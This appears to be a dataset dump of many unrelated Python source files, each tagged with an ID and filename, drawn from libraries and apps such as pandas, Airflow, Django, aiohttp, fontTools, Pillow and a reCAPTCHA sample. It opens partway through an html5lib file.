        if type == ""Doctype"":
            continue
        elif type in (""StartTag"", ""EmptyTag""):
            attrs = AttributesNSImpl(token[""data""],
                                     unadjustForeignAttributes)
            handler.startElementNS((token[""namespace""], token[""name""]),
                                   token[""name""],
                                   attrs)
            if type == ""EmptyTag"":
                handler.endElementNS((token[""namespace""], token[""name""]),
                                     token[""name""])
        elif type == ""EndTag"":
            handler.endElementNS((token[""namespace""], token[""name""]),
                                 token[""name""])
        elif type in (""Characters"", ""SpaceCharacters""):
            handler.characters(token[""data""])
        elif type == ""Comment"":
            pass
        else:
            assert False, ""Unknown token type""

    for prefix, namespace in prefix_mapping.items():
        handler.endPrefixMapping(prefix)
    handler.endDocument()"
JY456	JY456-test_fillna.py	"import pytest

import pandas as pd
import pandas._testing as tm


class TestDatetimeIndexFillNA:
    @pytest.mark.parametrize(""tz"", [""US/Eastern"", ""Asia/Tokyo""])
    def test_fillna_datetime64(self, tz):
        # GH 11343
        idx = pd.DatetimeIndex([""2011-01-01 09:00"", pd.NaT, ""2011-01-01 11:00""])

        exp = pd.DatetimeIndex(
            [""2011-01-01 09:00"", ""2011-01-01 10:00"", ""2011-01-01 11:00""]
        )
        tm.assert_index_equal(idx.fillna(pd.Timestamp(""2011-01-01 10:00"")), exp)

        # tz mismatch
        exp = pd.Index(
            [
                pd.Timestamp(""2011-01-01 09:00""),
                pd.Timestamp(""2011-01-01 10:00"", tz=tz),
                pd.Timestamp(""2011-01-01 11:00""),
            ],
            dtype=object,
        )
        tm.assert_index_equal(idx.fillna(pd.Timestamp(""2011-01-01 10:00"", tz=tz)), exp)

        # object
        exp = pd.Index(
            [pd.Timestamp(""2011-01-01 09:00""), ""x"", pd.Timestamp(""2011-01-01 11:00"")],
            dtype=object,
        )
        tm.assert_index_equal(idx.fillna(""x""), exp)

        idx = pd.DatetimeIndex([""2011-01-01 09:00"", pd.NaT, ""2011-01-01 11:00""], tz=tz)

        exp = pd.DatetimeIndex(
            [""2011-01-01 09:00"", ""2011-01-01 10:00"", ""2011-01-01 11:00""], tz=tz
        )
        tm.assert_index_equal(idx.fillna(pd.Timestamp(""2011-01-01 10:00"", tz=tz)), exp)

        exp = pd.Index(
            [
                pd.Timestamp(""2011-01-01 09:00"", tz=tz),
                pd.Timestamp(""2011-01-01 10:00""),
                pd.Timestamp(""2011-01-01 11:00"", tz=tz),
            ],
            dtype=object,
        )
        tm.assert_index_equal(idx.fillna(pd.Timestamp(""2011-01-01 10:00"")), exp)

        # object
        exp = pd.Index(
            [
                pd.Timestamp(""2011-01-01 09:00"", tz=tz),
                ""x"",
                pd.Timestamp(""2011-01-01 11:00"", tz=tz),
            ],
            dtype=object,
        )
        tm.assert_index_equal(idx.fillna(""x""), exp)"
JD367	JD367-get_site_key.py	"#!/usr/bin/env python
# Copyright 2021 Google, Inc
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# All Rights Reserved.

# [START recaptcha_enterprise_get_site_key]
from google.cloud import recaptchaenterprise_v1


def get_site_key(project_id: str, recaptcha_site_key: str) -> None:
    """"""
    Get the reCAPTCHA site key present under the project ID.

    Args:
    project_id: GCloud Project ID.
    recaptcha_site_key: Specify the site key to get the details.
    """"""

    client = recaptchaenterprise_v1.RecaptchaEnterpriseServiceClient()

    # Construct the key details.
    key_name = f""projects/{project_id}/keys/{recaptcha_site_key}""

    request = recaptchaenterprise_v1.GetKeyRequest()
    request.name = key_name

    key = client.get_key(request)
    print(""Successfully obtained the key !"" + key.name)


# [END recaptcha_enterprise_get_site_key]


if __name__ == ""__main__"":
    import google.auth
    import google.auth.exceptions

    # TODO(developer): Replace the below variables before running
    try:
        default_project_id = google.auth.default()[1]
        recaptcha_site_key = ""recaptcha_site_key""
    except google.auth.exceptions.DefaultCredentialsError:
        print(
            ""Please use `gcloud auth application-default login` ""
            ""or set GOOGLE_APPLICATION_CREDENTIALS to use this script.""
        )
    else:
        get_site_key(default_project_id, recaptcha_site_key)"
JD266	JD266-gem_port.py	"# Copyright 2017-present Adtran, Inc.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.


class GemPort(object):
    """"""
    Class to wrap TCont capabilities
    """"""
    def __init__(self, gem_id, alloc_id, uni_id, tech_profile_id,
                 encryption=False,
                 multicast=False,
                 traffic_class=None,
                 handler=None,
                 is_mock=False):

        self.gem_id = gem_id
        self._alloc_id = alloc_id
        self.uni_id = uni_id
        self.tech_profile_id = tech_profile_id
        self.traffic_class = traffic_class
        self._encryption = encryption
        self.multicast = multicast
        self._handler = handler
        self._is_mock = is_mock
        self.tech_profile_id = None     # TODO: Make property and clean up object once tech profiles fully supported

        # Statistics
        self.rx_packets = 0
        self.rx_bytes = 0
        self.tx_packets = 0
        self.tx_bytes = 0

    def __str__(self):
        return ""GemPort: alloc-id: {}, gem-id: {}, uni-id: {}"".format(self.alloc_id,
                                                                      self.gem_id,
                                                                      self.uni_id)

    @property
    def alloc_id(self):
        return self._alloc_id

    @property
    def encryption(self):
        return self._encryption

    def to_dict(self):
        return {
            'port-id': self.gem_id,
            'alloc-id': self.alloc_id,
            'encryption': self._encryption,
            'omci-transport': False
        }"
JY233	JY233-test_redshift_sql.py	"# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.
from __future__ import annotations

from unittest import mock
from unittest.mock import MagicMock

import pytest

from airflow.providers.amazon.aws.operators.redshift_sql import RedshiftSQLOperator
from airflow.providers.common.sql.hooks.sql import fetch_all_handler


class TestRedshiftSQLOperator:
    @pytest.mark.parametrize(""test_autocommit, test_parameters"", [(True, (""a"", ""b"")), (False, (""c"", ""d""))])
    @mock.patch(""airflow.providers.amazon.aws.operators.redshift_sql.RedshiftSQLOperator.get_db_hook"")
    def test_redshift_operator(self, mock_get_hook, test_autocommit, test_parameters):
        hook = MagicMock()
        mock_run = hook.run
        mock_get_hook.return_value = hook
        sql = MagicMock()
        operator = RedshiftSQLOperator(
            task_id=""test"", sql=sql, autocommit=test_autocommit, parameters=test_parameters
        )
        operator.execute(None)
        mock_run.assert_called_once_with(
            sql=sql,
            autocommit=test_autocommit,
            parameters=test_parameters,
            handler=fetch_all_handler,
            return_last=True,
        )"
JD263	JD263-PAS5211_comm.py	"#
# Copyright 2017 the original author or authors.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
import netifaces
from scapy.layers.l2 import Dot3
import structlog
from voltha.adapters.microsemi_olt.PAS5211 import PAS5211Msg, PAS5211MsgHeader, PAS5211FrameHeader

log = structlog.get_logger()

def constructPAS5211Frames(msg, seq, src_mac, dst_mac, channel_id=-1,
                           onu_id=-1, onu_session_id=-1):

    assert isinstance(msg, PAS5211Msg)
    opcode = 0x3000 | msg.opcode

    inner_msg = PAS5211MsgHeader(
        sequence_number=seq,
        opcode=opcode,
        channel_id=channel_id,
        onu_id=onu_id,
        onu_session_id=onu_session_id
    ) / msg

    size = len(inner_msg)
    frame_body = PAS5211FrameHeader(size=size) / inner_msg
    frame = Dot3(src=src_mac, dst=dst_mac) / frame_body

    return frame

def sequence_generator(init):
    num = init
    while True:
        yield num
        num += 1

def determine_src_mac(iface):
    if iface in netifaces.interfaces():
        return netifaces.ifaddresses(iface)[netifaces.AF_LINK][0]['addr']
    return None

class PAS5211Communication(object):
    def __init__(self, dst_mac, init=0, iface = None):
        self.iface = iface
        self.dst_mac = dst_mac
        self.src_mac = determine_src_mac(self.iface)
        self.seqgen = sequence_generator(init)

    def frame(self, msg, channel_id=-1, onu_id=-1, onu_session_id=-1):
        return constructPAS5211Frames(msg, self.seqgen.next(), self.src_mac,
                                      self.dst_mac, channel_id=channel_id,
                                      onu_id=onu_id, onu_session_id=onu_session_id)
"
JY65	JY65-web_server.py	"""""""Low level HTTP server.""""""
import asyncio
from typing import Any, Awaitable, Callable, Dict, List, Optional  # noqa

from .abc import AbstractStreamWriter
from .helpers import get_running_loop
from .http_parser import RawRequestMessage
from .streams import StreamReader
from .web_protocol import RequestHandler, _RequestFactory, _RequestHandler
from .web_request import BaseRequest

__all__ = (""Server"",)


class Server:
    def __init__(
        self,
        handler: _RequestHandler,
        *,
        request_factory: Optional[_RequestFactory] = None,
        loop: Optional[asyncio.AbstractEventLoop] = None,
        **kwargs: Any
    ) -> None:
        self._loop = get_running_loop(loop)
        self._connections: Dict[RequestHandler, asyncio.Transport] = {}
        self._kwargs = kwargs
        self.requests_count = 0
        self.request_handler = handler
        self.request_factory = request_factory or self._make_request

    @property
    def connections(self) -> List[RequestHandler]:
        return list(self._connections.keys())

    def connection_made(
        self, handler: RequestHandler, transport: asyncio.Transport
    ) -> None:
        self._connections[handler] = transport

    def connection_lost(
        self, handler: RequestHandler, exc: Optional[BaseException] = None
    ) -> None:
        if handler in self._connections:
            del self._connections[handler]

    def _make_request(
        self,
        message: RawRequestMessage,
        payload: StreamReader,
        protocol: RequestHandler,
        writer: AbstractStreamWriter,
        task: ""asyncio.Task[None]"",
    ) -> BaseRequest:
        return BaseRequest(message, payload, protocol, writer, task, self._loop)

    async def shutdown(self, timeout: Optional[float] = None) -> None:
        coros = [conn.shutdown(timeout) for conn in self._connections]
        await asyncio.gather(*coros)
        self._connections.clear()

    def __call__(self) -> RequestHandler:
        return RequestHandler(self, loop=self._loop, **self._kwargs)"
JY74	JY74-breadcrumbs.py	"from django.urls import get_script_prefix, resolve


def get_breadcrumbs(url, request=None):
    """"""
    Given a url returns a list of breadcrumbs, which are each a
    tuple of (name, url).
    """"""
    from rest_framework.reverse import preserve_builtin_query_params
    from rest_framework.views import APIView

    def breadcrumbs_recursive(url, breadcrumbs_list, prefix, seen):
        """"""
        Add tuples of (name, url) to the breadcrumbs list,
        progressively chomping off parts of the url.
        """"""
        try:
            (view, unused_args, unused_kwargs) = resolve(url)
        except Exception:
            pass
        else:
            # Check if this is a REST framework view,
            # and if so add it to the breadcrumbs
            cls = getattr(view, ""cls"", None)
            initkwargs = getattr(view, ""initkwargs"", {})
            if cls is not None and issubclass(cls, APIView):
                # Don't list the same view twice in a row.
                # Probably an optional trailing slash.
                if not seen or seen[-1] != view:
                    c = cls(**initkwargs)
                    name = c.get_view_name()
                    insert_url = preserve_builtin_query_params(prefix + url, request)
                    breadcrumbs_list.insert(0, (name, insert_url))
                    seen.append(view)

        if url == """":
            # All done
            return breadcrumbs_list

        elif url.endswith(""/""):
            # Drop trailing slash off the end and continue to try to
            # resolve more breadcrumbs
            url = url.rstrip(""/"")
            return breadcrumbs_recursive(url, breadcrumbs_list, prefix, seen)

        # Drop trailing non-slash off the end and continue to try to
        # resolve more breadcrumbs
        url = url[: url.rfind(""/"") + 1]
        return breadcrumbs_recursive(url, breadcrumbs_list, prefix, seen)

    prefix = get_script_prefix().rstrip(""/"")
    url = url[len(prefix) :]
    return breadcrumbs_recursive(url, [], prefix, [])"
JY297	JY297-_line.py	"import _plotly_utils.basevalidators


class LineValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""line"", parent_name=""scatter"", **kwargs):
        super(LineValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Line""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            backoff
                Sets the line back off from the end point of
                the nth line segment (in px). This option is
                useful e.g. to avoid overlap with arrowhead
                markers. With ""auto"" the lines would trim
                before markers if `marker.angleref` is set to
                ""previous"".
            backoffsrc
                Sets the source reference on Chart Studio Cloud
                for `backoff`.
            color
                Sets the line color.
            dash
                Sets the dash style of lines. Set to a dash
                type string (""solid"", ""dot"", ""dash"",
                ""longdash"", ""dashdot"", or ""longdashdot"") or a
                dash length list in px (eg ""5px,10px,2px,2px"").
            shape
                Determines the line shape. With ""spline"" the
                lines are drawn using spline interpolation. The
                other available values correspond to step-wise
                line shapes.
            simplify
                Simplifies lines by removing nearly-collinear
                points. When transitioning lines, it may be
                desirable to disable this so that the number of
                points along the resulting SVG path is
                unaffected.
            smoothing
                Has an effect only if `shape` is set to
                ""spline"" Sets the amount of smoothing. 0
                corresponds to no smoothing (equivalent to a
                ""linear"" shape).
            width
                Sets the line width (in px).
"""""",
            ),
            **kwargs,
        )"
JY137	JY137-formats.py	"# This file is distributed under the same license as the Django package.
#
# The *_FORMAT strings use the Django date format syntax,
# see https://docs.djangoproject.com/en/dev/ref/templates/builtins/#date
DATE_FORMAT = 'd F Y'  # 25 Ottobre 2006
TIME_FORMAT = 'H:i'  # 14:30
DATETIME_FORMAT = 'l d F Y H:i'  # Mercoledì 25 Ottobre 2006 14:30
YEAR_MONTH_FORMAT = 'F Y'  # Ottobre 2006
MONTH_DAY_FORMAT = 'j F'  # 25 Ottobre
SHORT_DATE_FORMAT = 'd/m/Y'  # 25/12/2009
SHORT_DATETIME_FORMAT = 'd/m/Y H:i'  # 25/10/2009 14:30
FIRST_DAY_OF_WEEK = 1  # Lunedì

# The *_INPUT_FORMATS strings use the Python strftime format syntax,
# see https://docs.python.org/library/datetime.html#strftime-strptime-behavior
DATE_INPUT_FORMATS = [
    '%d/%m/%Y', '%Y/%m/%d',  # '25/10/2006', '2008/10/25'
    '%d-%m-%Y', '%Y-%m-%d',  # '25-10-2006', '2008-10-25'
    '%d-%m-%y', '%d/%m/%y',  # '25-10-06', '25/10/06'
]
DATETIME_INPUT_FORMATS = [
    '%d/%m/%Y %H:%M:%S',     # '25/10/2006 14:30:59'
    '%d/%m/%Y %H:%M:%S.%f',  # '25/10/2006 14:30:59.000200'
    '%d/%m/%Y %H:%M',        # '25/10/2006 14:30'
    '%d/%m/%y %H:%M:%S',     # '25/10/06 14:30:59'
    '%d/%m/%y %H:%M:%S.%f',  # '25/10/06 14:30:59.000200'
    '%d/%m/%y %H:%M',        # '25/10/06 14:30'
    '%Y-%m-%d %H:%M:%S',     # '2006-10-25 14:30:59'
    '%Y-%m-%d %H:%M:%S.%f',  # '2006-10-25 14:30:59.000200'
    '%Y-%m-%d %H:%M',        # '2006-10-25 14:30'
    '%d-%m-%Y %H:%M:%S',     # '25-10-2006 14:30:59'
    '%d-%m-%Y %H:%M:%S.%f',  # '25-10-2006 14:30:59.000200'
    '%d-%m-%Y %H:%M',        # '25-10-2006 14:30'
    '%d-%m-%y %H:%M:%S',     # '25-10-06 14:30:59'
    '%d-%m-%y %H:%M:%S.%f',  # '25-10-06 14:30:59.000200'
    '%d-%m-%y %H:%M',        # '25-10-06 14:30'
]
DECIMAL_SEPARATOR = ','
THOUSAND_SEPARATOR = '.'
NUMBER_GROUPING = 3"
JY325	JY325-0003_initial.py	"# Generated by Django 4.1.4 on 2023-03-09 10:49

from django.db import migrations, models
import uuid


class Migration(migrations.Migration):

    initial = True

    dependencies = [
        ('core', '0002_remove_movie_videos_delete_customuser_delete_movie_and_more'),
    ]

    operations = [
        migrations.CreateModel(
            name='Profile',
            fields=[
                ('id', models.BigAutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),
                ('name', models.CharField(max_length=225)),
                ('age_limit', models.CharField(choices=[('All', 'All'), ('Kids', 'Kids')], max_length=5)),
                ('uuid', models.UUIDField(default=uuid.uuid4, unique=True)),
            ],
        ),
        migrations.CreateModel(
            name='Video',
            fields=[
                ('id', models.BigAutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),
                ('title', models.CharField(blank=True, max_length=225, null=True)),
                ('file', models.FileField(upload_to='movies')),
            ],
        ),
        migrations.CreateModel(
            name='Movie',
            fields=[
                ('id', models.BigAutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),
                ('title', models.CharField(max_length=225)),
                ('description', models.TextField()),
                ('created', models.DateTimeField(auto_now_add=True)),
                ('uuid', models.UUIDField(default=uuid.uuid4, unique=True)),
                ('type', models.CharField(choices=[('single', 'Single'), ('seasonal', 'Seasonal')], max_length=10)),
                ('flyer', models.ImageField(blank=True, null=True, upload_to='flyers')),
                ('age_limit', models.CharField(blank=True, choices=[('All', 'All'), ('Kids', 'Kids')], max_length=5, null=True)),
                ('videos', models.ManyToManyField(to='core.video')),
            ],
        ),
    ]"
JY405	JY405-urls.py	"from django.urls import path

from . import views

urlpatterns = [
    path("""", views.IndexView.as_view(), name=""index""),
    path(""auth-flow/"", views.AuthFlowView.as_view(), name=""auth-flow""),
    path(""task-flow/"", views.TaskFlowView.as_view(), name=""task-flow""),
    path(""auth-token/"", views.TokenView.as_view(), name=""auth-token""),
    path(""thank-you/"", views.ThanksView.as_view(), name=""thank-you""),
    path(""lock/<int:user_id>/"", views.LockUserView.as_view(), name=""lock-user""),
    path(
        ""admin-dashboard/"", views.AdminDashboardView.as_view(), name=""admin_dashboard""
    ),
    path(
        ""admin-experiment/<int:experiment_id>/"",
        views.AdminExperimentView.as_view(),
        name=""admin_experiment"",
    ),
    path(
        ""admin/experiment/create/"",
        views.AdminCreateExperimentView.as_view(),
        name=""create-experiment"",
    ),
    path(
        ""create-annotation/"",
        views.CreateAnnotation.as_view(),
        name=""create_annotation"",
    ),
    path(
        ""admin-management/"",
        views.AdminManagementView.as_view(),
        name=""admin-management"",
    ),
    path(""admin/delete/<int:pk>"", views.PerformDelete.as_view(), name=""perform-delete""),
    path(
        ""admin/submit-batch"",
        views.AdminBatchSubmitView.as_view(),
        name=""admin-batch-submit"",
    ),
    # APIs
    path(""api/v1/admin-api/"", views.AdminAPIView.as_view(), name=""admin-api-url""),
    path(
        ""api/v1/annotation-list/"",
        views.AnnotationListAPI.as_view(),
        name=""annotation-api"",
    ),
    path(""api/v1/lock-users/"", views.UserLockAPIView.as_view(), name=""lock-users-api""),
    path(
        ""api/v1/batch-tasks/"", views.BatchTasksAPIView.as_view(), name=""batch-tasks-api""
    ),
]"
JY493	JY493-_l_o_c_a.py	"from . import DefaultTable
import sys
import array
import logging


log = logging.getLogger(__name__)


class table__l_o_c_a(DefaultTable.DefaultTable):

    dependencies = [""glyf""]

    def decompile(self, data, ttFont):
        longFormat = ttFont[""head""].indexToLocFormat
        if longFormat:
            format = ""I""
        else:
            format = ""H""
        locations = array.array(format)
        locations.frombytes(data)
        if sys.byteorder != ""big"":
            locations.byteswap()
        if not longFormat:
            l = array.array(""I"")
            for i in range(len(locations)):
                l.append(locations[i] * 2)
            locations = l
        if len(locations) < (ttFont[""maxp""].numGlyphs + 1):
            log.warning(
                ""corrupt 'loca' table, or wrong numGlyphs in 'maxp': %d %d"",
                len(locations) - 1,
                ttFont[""maxp""].numGlyphs,
            )
        self.locations = locations

    def compile(self, ttFont):
        try:
            max_location = max(self.locations)
        except AttributeError:
            self.set([])
            max_location = 0
        if max_location < 0x20000 and all(l % 2 == 0 for l in self.locations):
            locations = array.array(""H"")
            for i in range(len(self.locations)):
                locations.append(self.locations[i] // 2)
            ttFont[""head""].indexToLocFormat = 0
        else:
            locations = array.array(""I"", self.locations)
            ttFont[""head""].indexToLocFormat = 1
        if sys.byteorder != ""big"":
            locations.byteswap()
        return locations.tobytes()

    def set(self, locations):
        self.locations = array.array(""I"", locations)

    def toXML(self, writer, ttFont):
        writer.comment(""The 'loca' table will be calculated by the compiler"")
        writer.newline()

    def __getitem__(self, index):
        return self.locations[index]

    def __len__(self):
        return len(self.locations)"
JD65	JD65-users.py	"from typing import Optional

from fastapi import Depends, Request
from fastapi_users import BaseUserManager, FastAPIUsers, IntegerIDMixin
from fastapi_users.authentication import AuthenticationBackend, BearerTransport, CookieTransport, JWTStrategy
from fastapi_users.db import SQLAlchemyUserDatabase

import crud
from app import models
from app.deps import get_db
from .db import User, get_user_db
from .secrets import secrets

class UserManager(IntegerIDMixin, BaseUserManager[User, int]):
    reset_password_token_secret = secrets['SECRET_KEY']
    verification_token_secret = secrets['SECRET_KEY']

    async def on_after_register(self, user: User, request: Optional[Request] = None):
        print(f""User {user.id} has registered."")

    async def on_after_forgot_password(
        self, user: User, token: str, request: Optional[Request] = None
    ):
        print(f""User {user.id} has forgot their password. Reset token: {token}"")

    async def on_after_request_verify(
        self, user: User, token: str, request: Optional[Request] = None
    ):
        print(f""Verification requested for user {user.id}. Verification token: {token}"")


async def get_user_manager(user_db: SQLAlchemyUserDatabase = Depends(get_user_db)):
    yield UserManager(user_db)


bearer_transport = BearerTransport(tokenUrl=""auth/jwt/login"")


def get_jwt_strategy() -> JWTStrategy:
    return JWTStrategy(secret=secrets['SECRET_KEY'], lifetime_seconds=3600)


jwt_auth_backend = AuthenticationBackend(
    name=""jwt"",
    transport=bearer_transport,
    get_strategy=get_jwt_strategy,
)

cookie_transport = CookieTransport(cookie_max_age=3600)

cookie_auth_backend = AuthenticationBackend(
    name=""cookie"",
    transport=cookie_transport,
    get_strategy=get_jwt_strategy,
)

fastapi_users = FastAPIUsers[User, int](get_user_manager, [jwt_auth_backend, cookie_auth_backend])

current_active_user = fastapi_users.current_user(active=True)

async def get_current_profile(user: User = Depends(current_active_user), db = Depends(get_db)):
    profile = await crud.read(_id=user.id, db=db, model=models.Profile)
    return profile"
JY98	JY98-__init__.py	"""""""
rest_framework.schemas

schemas:
    __init__.py
    generators.py   # Top-down schema generation
    inspectors.py   # Per-endpoint view introspection
    utils.py        # Shared helper functions
    views.py        # Houses `SchemaView`, `APIView` subclass.

We expose a minimal ""public"" API directly from `schemas`. This covers the
basic use-cases:

    from rest_framework.schemas import (
        AutoSchema,
        ManualSchema,
        get_schema_view,
        SchemaGenerator,
    )

Other access should target the submodules directly
""""""
from rest_framework.settings import api_settings

from . import coreapi, openapi
from .coreapi import AutoSchema, ManualSchema, SchemaGenerator  # noqa
from .inspectors import DefaultSchema  # noqa


def get_schema_view(
    title=None,
    url=None,
    description=None,
    urlconf=None,
    renderer_classes=None,
    public=False,
    patterns=None,
    generator_class=None,
    authentication_classes=api_settings.DEFAULT_AUTHENTICATION_CLASSES,
    permission_classes=api_settings.DEFAULT_PERMISSION_CLASSES,
    version=None,
):
    """"""
    Return a schema view.
    """"""
    if generator_class is None:
        if coreapi.is_enabled():
            generator_class = coreapi.SchemaGenerator
        else:
            generator_class = openapi.SchemaGenerator

    generator = generator_class(
        title=title,
        url=url,
        description=description,
        urlconf=urlconf,
        patterns=patterns,
        version=version,
    )

    # Avoid import cycle on APIView
    from .views import SchemaView

    return SchemaView.as_view(
        renderer_classes=renderer_classes,
        schema_generator=generator,
        public=public,
        authentication_classes=authentication_classes,
        permission_classes=permission_classes,
    )"
JY390	JY390-suggestion_list.py	"from collections import OrderedDict


def suggestion_list(inp, options):
    """"""
     Given an invalid input string and a list of valid options, returns a filtered
     list of valid options sorted based on their similarity with the input.
    """"""
    options_by_distance = OrderedDict()
    input_threshold = len(inp) / 2

    for option in options:
        distance = lexical_distance(inp, option)
        threshold = max(input_threshold, len(option) / 2, 1)
        if distance <= threshold:
            options_by_distance[option] = distance

    return sorted(
        list(options_by_distance.keys()), key=lambda k: options_by_distance[k]
    )


def lexical_distance(a, b):
    """"""
     Computes the lexical distance between strings A and B.
     The ""distance"" between two strings is given by counting the minimum number
     of edits needed to transform string A into string B. An edit can be an
     insertion, deletion, or substitution of a single character, or a swap of two
     adjacent characters.
     This distance can be useful for detecting typos in input or sorting
     @returns distance in number of edits
    """"""

    d = [[i] for i in range(len(a) + 1)] or []
    d_len = len(d) or 1
    for i in range(d_len):
        for j in range(1, len(b) + 1):
            if i == 0:
                d[i].append(j)
            else:
                d[i].append(0)

    for i in range(1, len(a) + 1):
        for j in range(1, len(b) + 1):
            cost = 0 if a[i - 1] == b[j - 1] else 1

            d[i][j] = min(d[i - 1][j] + 1, d[i][j - 1] + 1, d[i - 1][j - 1] + cost)

            if i > 1 and j < 1 and a[i - 1] == b[j - 2] and a[i - 2] == b[j - 1]:
                d[i][j] = min(d[i][j], d[i - 2][j - 2] + cost)

    return d[len(a)][len(b)]"
JD25	JD25-pydevd_thread_wrappers.py	"from _pydev_bundle._pydev_saved_modules import threading


def wrapper(fun):

    def pydev_after_run_call():
        pass

    def inner(*args, **kwargs):
        fun(*args, **kwargs)
        pydev_after_run_call()

    return inner


def wrap_attr(obj, attr):
    t_save_start = getattr(obj, attr)
    setattr(obj, attr, wrapper(t_save_start))
    obj._pydev_run_patched = True


class ObjectWrapper(object):

    def __init__(self, obj):
        self.wrapped_object = obj
        try:
            import functools
            functools.update_wrapper(self, obj)
        except:
            pass

    def __getattr__(self, attr):
        orig_attr = getattr(self.wrapped_object, attr)  # .__getattribute__(attr)
        if callable(orig_attr):

            def patched_attr(*args, **kwargs):
                self.call_begin(attr)
                result = orig_attr(*args, **kwargs)
                self.call_end(attr)
                if result == self.wrapped_object:
                    return self
                return result

            return patched_attr
        else:
            return orig_attr

    def call_begin(self, attr):
        pass

    def call_end(self, attr):
        pass

    def __enter__(self):
        self.call_begin(""__enter__"")
        self.wrapped_object.__enter__()
        self.call_end(""__enter__"")

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.call_begin(""__exit__"")
        self.wrapped_object.__exit__(exc_type, exc_val, exc_tb)


def factory_wrapper(fun):

    def inner(*args, **kwargs):
        obj = fun(*args, **kwargs)
        return ObjectWrapper(obj)

    return inner


def wrap_threads():
    # TODO: add wrappers for thread and _thread
    # import _thread as mod
    # print(""Thread imported"")
    # mod.start_new_thread = wrapper(mod.start_new_thread)
    threading.Lock = factory_wrapper(threading.Lock)
    threading.RLock = factory_wrapper(threading.RLock)

    # queue patching
    import queue  # @UnresolvedImport
    queue.Queue = factory_wrapper(queue.Queue)"
JY330	JY330-auto.py	"#
# Copyright 2011 Facebook
#
# Licensed under the Apache License, Version 2.0 (the ""License""); you may
# not use this file except in compliance with the License. You may obtain
# a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
# License for the specific language governing permissions and limitations
# under the License.

""""""Implementation of platform-specific functionality.

For each function or class described in `tornado.platform.interface`,
the appropriate platform-specific implementation exists in this module.
Most code that needs access to this functionality should do e.g.::

    from tornado.platform.auto import set_close_exec
""""""

from __future__ import absolute_import, division, print_function

import os

if 'APPENGINE_RUNTIME' in os.environ:
    from tornado.platform.common import Waker

    def set_close_exec(fd):
        pass
elif os.name == 'nt':
    from tornado.platform.common import Waker
    from tornado.platform.windows import set_close_exec
else:
    from tornado.platform.posix import set_close_exec, Waker

try:
    # monotime monkey-patches the time module to have a monotonic function
    # in versions of python before 3.3.
    import monotime
    # Silence pyflakes warning about this unused import
    monotime
except ImportError:
    pass
try:
    # monotonic can provide a monotonic function in versions of python before
    # 3.3, too.
    from monotonic import monotonic as monotonic_time
except ImportError:
    try:
        from time import monotonic as monotonic_time
    except ImportError:
        monotonic_time = None

__all__ = ['Waker', 'set_close_exec', 'monotonic_time']"
JY489	JY489-XVThumbImagePlugin.py	"#
# The Python Imaging Library.
# $Id$
#
# XV Thumbnail file handler by Charles E. ""Gene"" Cash
# (gcash@magicnet.net)
#
# see xvcolor.c and xvbrowse.c in the sources to John Bradley's XV,
# available from ftp://ftp.cis.upenn.edu/pub/xv/
#
# history:
# 98-08-15 cec  created (b/w only)
# 98-12-09 cec  added color palette
# 98-12-28 fl   added to PIL (with only a few very minor modifications)
#
# To do:
# FIXME: make save work (this requires quantization support)
#

from . import Image, ImageFile, ImagePalette
from ._binary import o8

_MAGIC = b""P7 332""

# standard color palette for thumbnails (RGB332)
PALETTE = b""""
for r in range(8):
    for g in range(8):
        for b in range(4):
            PALETTE = PALETTE + (
                o8((r * 255) // 7) + o8((g * 255) // 7) + o8((b * 255) // 3)
            )


def _accept(prefix):
    return prefix[:6] == _MAGIC


##
# Image plugin for XV thumbnail images.


class XVThumbImageFile(ImageFile.ImageFile):

    format = ""XVThumb""
    format_description = ""XV thumbnail image""

    def _open(self):

        # check magic
        if not _accept(self.fp.read(6)):
            msg = ""not an XV thumbnail file""
            raise SyntaxError(msg)

        # Skip to beginning of next line
        self.fp.readline()

        # skip info comments
        while True:
            s = self.fp.readline()
            if not s:
                msg = ""Unexpected EOF reading XV thumbnail file""
                raise SyntaxError(msg)
            if s[0] != 35:  # ie. when not a comment: '#'
                break

        # parse header line (already read)
        s = s.strip().split()

        self.mode = ""P""
        self._size = int(s[0]), int(s[1])

        self.palette = ImagePalette.raw(""RGB"", PALETTE)

